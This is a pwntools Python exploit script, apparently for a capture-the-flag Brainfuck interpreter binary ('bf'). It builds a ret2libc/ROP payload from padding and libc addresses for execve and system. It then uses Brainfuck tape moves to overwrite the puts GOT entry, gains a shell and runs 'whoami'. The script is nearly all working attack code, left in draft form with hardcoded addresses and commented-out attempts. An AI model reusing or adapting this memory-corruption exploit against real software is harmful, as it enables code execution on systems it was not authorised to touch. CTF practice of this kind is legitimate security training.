from pwn import *

context.update(arch="i386", os="linux")

# Logging
log.info("Start pwning...")

# Load executable
exe = ELF("./bf")

# Libc
libc = exe.libc
#libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb 
libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb 
#libc_base = 0xf7e0a000 # TODO - re-adjust base - I changed it cuz of gdb 
libc.address = libc_base
puts_addr = p32(next(libc.search(b"puts")))
#execve_addr = p32(next(libc.search(b"libc_system")))
puts_addr = libc.symbols["puts"]
puts_plt = p32(exe.plt['puts'])
#print(f"puts plt: {puts_plt}")

rop = ROP(libc)
rop_addr = rop.ebx.address
#rop.execve(sh_addr,0,0)
#my_rop = b'p\xb3\xec\xf7baaa\n\x00\x00\x00' # sleep 10
#my_rop = b'\xc0\xb8\xec\xf7baaa+k\xf7\xf7\x10\x00\x00\x00/usr/bin/ls\x00' #ls
#0x000183a5
target = libc_base + 0x001134d9 # add to esp
my_rop = p32(target)
print(f"ROP: {my_rop}")

print(f"ROP offset: {hex(rop.ebx.address)}")
#print(f"DUMP: {my_rop.dump()}")
# Start process
conn = process("./bf")
#conn = gdb.debug("./bf",
#env={"LD_PRELOAD":"./libc.so.6"}, gdbscript='''
#br *0x8048717
#'''
#)

with open("payload", "w") as f:
    f.write("")
#payload = ",.,.<\nAB\n".encode() # --> should work
# 1st part - before the input - just the commands
system_addr = libc.symbols["system"]
execve_addr = libc.symbols["execve"]
print(f"system_addr: {str(system_addr)}")
print(f"execve: {p32(execve_addr)}")
padding = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa"  
# fill stack with arbitrary values so I can increase esp and prepare stack for
#payload = padding +sh_addr + system_addr
sh_addr = system_addr + 0x120d7b

exit_addr = libc.symbols["exit"]
return_addr = 0x08048830 # return from program - we call it since if we call
return_addr = libc_base + 0x00003980 # return from program - we call it since if we call
#exit() then our execve() fork process will die
arbitrary_bash_addr = 0xffffcc0c
new_esp_val = 0x12345678
payload=padding+p32(0xdeadbeef)+p32(execve_addr)+p32(return_addr)+p32(sh_addr)+p32(0xffff2222)+p32(0xffff1234)+p32(sh_addr)+ p32(new_esp_val)
print(f"sh_addr: {str(sh_addr)}")
payload += b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
#payload += "<" * 128 #move back 136 bytes -,.\nAB\n".encode() # --> should work
payload += b",>,>,>," # putchar - for sending the last char
payload += b"[" # call to puts()
payload +=b"\n"
conn.send(payload)
#payload += "." # call to putchar()
# 2nd part - the input to write ( the function to jump to ) 
with open("payload", "wb+") as f:
    f.write(payload)
# separate sends cuz of annoying encoding / decoding issue with p32() and
# strings
#pop_eax_address = libc_base + 0x0002407e
#print(f" POP: {hex(pop_eax_address)}")
#payload = p32(pop_eax_address) # pop eax  - I might need to call it like 0x128
#payload = bytes(my_rop)
payload = my_rop
#payload = p32(0xf7e55db0) # system()
#payload += my_rop # pop eax  - I might need to call it like 0x128
payload +=b"\n"
conn.send(payload)
with open("payload", "ab+") as f:
    f.write(payload)

#payload += "AAAA"
#payload += system_addr
#payload += ".+" * 224 # print 4 characters from puts() function
#payload = payload.encode().replace('\\n','\n')
print(payload)

got_check = p64(exe.got['puts']) # the function address in GOT

print(f"got addr: {got_check}, puts: {puts_addr}")

print(conn.recvline()) # receive until newline
#print(conn.recvline()) # receive until newline
output = conn.recv()
print(f"Program output: {output}") # receive until newline
conn.send("whoami\n")
output = conn.recvline()
#output += conn.recvline()
#output += conn.recvline()
print(f"Program output: {output.decode()}") # receive until newline
#conn.recvuntil(b"result:") # receive until given keyword
#conn.send(b"-,+" + "\n" + "AB")



